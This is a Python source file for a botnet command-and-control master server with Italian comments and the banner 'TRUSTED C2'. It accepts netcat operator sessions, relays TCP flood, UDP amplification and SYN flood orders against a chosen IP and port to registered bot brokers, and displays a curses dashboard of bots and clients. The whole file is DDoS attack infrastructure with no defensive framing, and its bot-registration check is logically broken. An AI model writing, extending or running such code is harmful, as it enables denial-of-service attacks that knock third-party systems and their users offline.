#!/usr/bin/env python3
# c2_master_vps.py - Real UI + TCP/UDP/SYN
import socket, threading, json, subprocess, time, os
import curses
from concurrent.futures import ThreadPoolExecutor

class C2Master:
    def __init__(self):
        self.brokers = {}  # {broker_ip: num_clients}
        self.users = set()  # NC sessions
        self.c2_port = 6666
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind(('0.0.0.0', self.c2_port))
        self.server.listen(50)
        
    def handle_nc_user(self, conn, addr):
        user_id = f"user_{len(self.users)}_{addr[0]}"
        self.users.add(user_id)
        conn.send(b"\n=== TRUSTED C2 ===\n")
        conn.send(b"Comandi: ddos_tcp IP PORT | ddos_udp IP PORT | syn IP PORT | list | stats\n")
        
        while True:
            try:
                cmd = conn.recv(1024).decode().strip()
                if cmd.startswith("ddos_tcp"):
                    _, ip, port = cmd.split()
                    self.broadcast(json.dumps({"cmd":"TCP_FLOOD", "target":ip, "port":int(port)}))
                    conn.send(f"TCP DDoS {ip}:{port} → ALL BROKERS\n".encode())
                elif cmd.startswith("ddos_udp"):
                    _, ip, port = cmd.split()
                    self.broadcast(json.dumps({"cmd":"UDP_AMP", "target":ip, "port":int(port)}))
                    conn.send(f"UDP AMP {ip}:{port} → ALL\n".encode())
                elif cmd.startswith("syn"):
                    _, ip, port = cmd.split()
                    self.broadcast(json.dumps({"cmd":"SYN_FLOOD", "target":ip, "port":int(port)}))
                    conn.send(f"SYN {ip}:{port} → ALL\n".encode())
                elif cmd == "list":
                    conn.send(json.dumps(self.brokers, indent=2).encode())
                elif cmd == "stats":
                    total_clients = sum(self.brokers.values())
                    conn.send(f"Brokers: {len(self.brokers)} | Clients: {total_clients} | Users: {len(self.users)}\n".encode())
                else:
                    conn.send(b"Cmd non valido\n")
            except: break
        
        self.users.discard(user_id)
        conn.close()
    
    def handle_bot(self, conn, addr):
        broker_ip = addr[0]
        while True:
            try:
                data = conn.recv(4096).decode()
                if data.startswith("REGISTER:"):
                    clients = int(data.split(":")[1])
                    self.brokers[broker_ip] = clients
                    print(f"✅ [{broker_ip}] {clients} clients")
                    break
            except: break
        conn.close()
    
    def broadcast(self, payload):
        """Invia a tutti brokers"""
        for broker_ip in list(self.brokers.keys()):
            try:
                s = socket.socket()
                s.settimeout(1)
                s.connect((broker_ip, 6667))  # Bot listener port
                s.send(payload.encode())
                s.close()
            except: 
                if broker_ip in self.brokers: del self.brokers[broker_ip]
    
    def ui_thread(self):
        """Curses UI"""
        def curses_ui(stdscr):
            curses.curs_set(0)
            curses.cbreak()
            stdscr.nodelay(1)
            while True:
                stdscr.clear()
                stdscr.addstr(0, 0, "=== TRUSTED C2 MASTER ===", curses.A_BOLD)
                stdscr.addstr(2, 0, f"Brokers: {len(self.brokers)}")
                total_clients = sum(self.brokers.values())
                stdscr.addstr(3, 0, f"Clients: {total_clients}")
                stdscr.addstr(4, 0, f"Users: {len(self.users)}")
                
                y = 6
                for broker, clients in self.brokers.items():
                    stdscr.addstr(y, 0, f"{broker}: {clients} clients")
                    y += 1
                
                stdscr.refresh()
                time.sleep(1)
        
        curses.wrapper(curses_ui)
    
    def run(self):
        print(f"🚀 C2 su :{self.c2_port} | nc IP 6666")
        threading.Thread(target=self.ui_thread, daemon=True).start()
        
        while True:
            conn, addr = self.server.accept()
            if addr[0] in [b.split('.')[0:3] for b in self.brokers]:  # Bot port?
                threading.Thread(target=self.handle_bot, args=(conn, addr), daemon=True).start()
            else:
                threading.Thread(target=self.handle_nc_user, args=(conn, addr), daemon=True).start()

if __name__ == "__main__":
    C2Master().run()
